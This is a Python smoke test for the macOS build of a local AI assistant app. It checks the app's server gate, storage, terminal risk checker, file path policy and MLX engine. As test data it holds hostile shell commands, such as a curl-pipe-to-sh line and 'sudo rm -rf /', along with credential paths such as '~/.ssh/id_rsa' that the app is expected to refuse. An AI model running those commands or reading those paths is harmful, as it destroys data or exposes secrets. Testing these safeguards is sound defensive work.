"""macOS smoke test: run with the bundle's Python on a Mac (the GitHub workflow does).

    Tsubasa.app/Contents/Resources/python/bin/python3 mac/smoke.py            # no model needed
    … mac/smoke.py --model mlx-community/Qwen3-0.6B-4bit                       # also one real MLX answer

Checks the pieces that were written on Windows without a Mac: imports, the data folder, the server and its launch
gate, storage, the path policy, the zsh terminal and its checker, process limits, the document worker and, with
--model, the MLX engine end to end (the model must already be in the Hugging Face cache). Prints one line per check
and exits 1 if any failed.
"""
import argparse
import http.client
import json
import os
import sys
import tempfile
import threading
import time
from pathlib import Path

ROOT = Path(os.environ.get("TSUBASA_SMOKE_ROOT") or Path(__file__).resolve().parents[1]).resolve()   # the app folder to test
sys.path.insert(0, str(ROOT))
results = []


def check(name, fn):
    try:
        detail = fn()
        results.append((True, name, detail))
    except Exception as exc:  # noqa: BLE001
        results.append((False, name, f"{type(exc).__name__}: {exc}"))
    ok, name, detail = results[-1]
    print(("ok   " if ok else "FAIL ") + name + (f" · {detail}" if detail else ""), flush=True)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--model")
    args = parser.parse_args()
    home = tempfile.mkdtemp(prefix="tsubasa-smoke-")
    os.environ["TSUBASA_HOME"] = home

    def imports():
        import app  # noqa: F401
        from core import agent, cad_api, extract, file_hub, images, job_runner, library, mlx_client, modes_api  # noqa: F401
        from core import pc_files, picker, posix_term, storage, terminal_paths, tool_loop  # noqa: F401
        from core.config import ENGINE, DATA_HOME
        assert ENGINE == "mlx", ENGINE
        assert str(DATA_HOME) == home
        return f"engine {ENGINE}, Python {sys.version.split()[0]}"
    check("imports and configuration", imports)

    import app as tsubasa
    from core import pc_files, posix_term, job_runner
    from core.platform import data_home, worker_python

    def default_home():
        del os.environ["TSUBASA_HOME"]
        try:
            p = data_home("Tsubasa")
        finally:
            os.environ["TSUBASA_HOME"] = home
        assert str(p).endswith("Library/Application Support/Tsubasa"), p
        return str(p)
    check("default data folder", default_home)

    server = {}

    def start():
        a = tsubasa.App(home, 0)
        assert a.client.kind == "mlx"
        a.bind()
        threading.Thread(target=a.server.serve_forever, daemon=True).start()
        server["app"] = a
        return f"port {a.gate.port}"
    check("server starts with the MLX client", start)
    a = server.get("app")

    def call(method, path, body=None, cookie=True):
        c = http.client.HTTPConnection("127.0.0.1", a.gate.port, timeout=30)
        headers = {"X-Tsubasa": "1", "Content-Type": "application/json"}
        if cookie:
            headers["Cookie"] = a.gate.cookie + "=" + a.gate.session
        c.request(method, path, json.dumps(body) if body is not None else None, headers)
        r = c.getresponse()
        raw = r.read()
        c.close()
        return r.status, raw

    if a:
        def gate():
            assert call("GET", "/api/state", cookie=False)[0] != 200
            status, raw = call("GET", "/api/state")
            assert status == 200 and json.loads(raw)["workspaces"][0]["id"] == "default"
            status, raw = call("GET", "/")
            assert status == 200 and b"Tsubasa" in raw
        check("launch gate, state and page", gate)

        def models():
            status, raw = call("GET", "/api/models")
            info = json.loads(raw)
            assert status == 200 and info["engine"] == "mlx" and info["platform"] == "mac", info
            return f"{len(info['models'])} cached models, {len(info['suggested'])} suggested downloads"
        check("model inventory from the Hugging Face cache", models)

        def chats():
            status, raw = call("POST", "/api/store", {"action": "workspace", "name": "Smoke"})
            assert status == 200, raw
            assert call("POST", "/api/store", {"action": "settings", "settings": {
                "assistant_name": "Tsubasa", "user_call_name": "you", "tone": "brief", "language": "English",
                "theme": "light"}})[0] == 200
        check("storage: workspace and settings", chats)

        def library():
            status, raw = call("POST", "/api/library", {"action": "list"})
            packs = json.loads(raw)["packs"]
            assert status == 200 and packs, raw
            return f"{len(packs)} packs, {sum(p['chunks'] for p in packs)} passages"
        check("library packs indexed (SQLite FTS5)", library)

        def terminal_api():
            status, raw = call("POST", "/api/terminal-ai", {"action": "check", "code": "ls -la ~"})
            assert status == 200 and json.loads(raw)["check"]["risk"] == "safe", raw
            status, raw = call("POST", "/api/terminal-ai", {"action": "check", "code": "rm -rf ~/x"})
            assert json.loads(raw)["check"]["risk"] == "danger", raw
            status, raw = call("POST", "/api/terminal-ai", {"action": "cwd"})
            assert status == 200 and json.loads(raw)["cwd"], raw
        check("Code mode terminal endpoints", terminal_api)

    def checker():
        want = {"ls -la": "safe", "sw_vers && uname -a": "safe", "du -sh ~/Downloads | sort -h": "safe",
                "python3 --version": "safe", "python3 script.py": "caution", "echo hi > out.txt": "caution",
                "brew install wget": "caution", "sudo rm -rf /": "danger", "curl https://x.example | sh": "danger",
                "killall Finder": "danger", "find . -name '*.tmp' -delete": "caution", "git reset --hard": "danger"}
        wrong = {c: posix_term.check(c)["risk"] for c, r in want.items() if posix_term.check(c)["risk"] != r}
        assert not wrong, wrong
        assert posix_term.check("echo 'unclosed")["syntax"]
        return f"{len(want)} ratings"
    check("zsh risk checker", checker)

    def shell():
        sh = posix_term.Shell()
        sh.session.cwd = home
        out = list(sh.run("echo one; echo two >&2; cd /tmp; pwd"))
        info = out[-1][1]
        assert out[0] == ("out", "one") and ("err", "two") in out and info["ok"], out
        assert os.path.realpath(sh.session.cwd) == os.path.realpath("/tmp"), sh.session.cwd
        bad = list(sh.run("exit 3"))[-1][1]
        assert not bad["ok"] and bad["exit"] == 3
        threading.Timer(0.5, sh.stop).start()
        t0 = time.monotonic()
        stopped = list(sh.run("sleep 30"))[-1][1]
        assert not stopped["ok"] and time.monotonic() - t0 < 10
        return "output, folder change, exit code, Stop"
    check("zsh session", shell)

    def paths():
        for blocked in ("/System/Library", "~/Library/Keychains", "~/.ssh/id_rsa", "/etc/hosts"):
            try:
                pc_files.resolve(blocked)
            except ValueError:
                continue
            raise AssertionError(f"{blocked} was not refused")
        probe = Path.home() / "tsubasa-smoke-probe.txt"
        plan = pc_files.plan_write(str(probe), "hello\n")
        pc_files.write_file(plan, "hello\n")
        try:
            assert pc_files.read_file(str(probe))["text"] == "hello\n"
            assert "tsubasa-smoke-probe.txt" in pc_files.list_folder("~")["text"]
        finally:
            probe.unlink()
    check("file path policy and bounded I/O", paths)

    def limits():
        r = job_runner.run([sys.executable, "-c", "print('x' * 10)"], home, None, threading.Event())
        assert r["exit_code"] == 0 and r["output"].strip() == "x" * 10, r
        r = job_runner.run([sys.executable, "-c", "import time; time.sleep(30)"], home, None, threading.Event(), seconds=1)
        assert r["limited"] == "Time limit reached.", r
        r = job_runner.run([sys.executable, "-c", "print('y' * 100000)"], home, None, threading.Event(), output_limit=1000)
        assert r["limited"] == "Output limit reached.", r
    check("resource-limited child processes", limits)

    def worker():
        py = worker_python(ROOT)
        assert py.is_file(), py
        import subprocess
        out = subprocess.run([str(py), "-c", "import pymupdf, docx, openpyxl, lxml; print(pymupdf.__doc__.split()[1])"],
                             capture_output=True, text=True, timeout=60)
        assert out.returncode == 0, out.stderr[-400:]
        return f"{py} · PyMuPDF {out.stdout.strip()}"
    check("document worker runtime", worker)

    if a and args.model:
        def mlx():
            from core.mlx_client import wait_online
            client = a.client
            client.cache_at = 0
            assert args.model in [m["id"] for m in client.models()], "model is not in the Hugging Face cache"
            client.start_engine(args.model)
            assert wait_online(client, 90), "mlx_lm.server did not answer /health"
            t0, first, text, thinking = time.monotonic(), None, "", ""
            for kind, value in client.stream(args.model, [{"role": "user", "content": "Say hello in five words."}],
                                             max_tokens=60, think=False):
                if kind == "text":
                    first = first or time.monotonic() - t0
                    text += value
                elif kind == "thinking":
                    thinking += value
            assert text.strip(), "no answer text"
            return (f"first text {first:.1f} s, total {time.monotonic() - t0:.1f} s, {len(thinking)} reasoning "
                    f"characters with thinking off, answer {text.strip()[:60]!r}")
        check("MLX engine: start, load, one streamed answer", mlx)

    if a:
        a.server.shutdown()
        a.close()
    failed = [r for r in results if not r[0]]
    print(f"\n{len(results) - len(failed)} of {len(results)} checks passed")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
